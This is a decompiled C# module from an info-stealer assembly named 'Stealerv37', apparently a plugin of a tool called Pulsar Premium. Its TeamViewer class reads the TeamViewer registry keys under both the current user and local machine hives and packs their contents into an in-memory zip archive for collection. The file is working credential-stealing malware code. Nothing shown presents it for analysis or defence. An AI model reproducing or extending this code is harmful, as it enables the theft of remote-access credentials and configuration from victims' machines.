// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Applications.TeamViewer
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper;
using Intelix.Helper.Data;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Linq;

#nullable disable
namespace Intelix.Targets.Applications;

public class TeamViewer : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    List<string> stringList = new List<string>();
    using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\TeamViewer"))
      stringList.AddRange((IEnumerable<string>) RegistryParser.ParseKey(key));
    using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\TeamViewer", false))
      stringList.AddRange((IEnumerable<string>) RegistryParser.ParseKey(key));
    if (!stringList.Any<string>())
      return;
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (TeamViewer);
    string entryPath = "TeamViewer\\Registry.txt";
    zip.AddTextFile(entryPath, string.Join("\n", (IEnumerable<string>) stringList));
    counterApplications.Files.Add("SOFTWARE\\TeamViewer => " + entryPath);
    counterApplications.Files.Add(entryPath);
    counter.Applications.Add(counterApplications);
  }
}
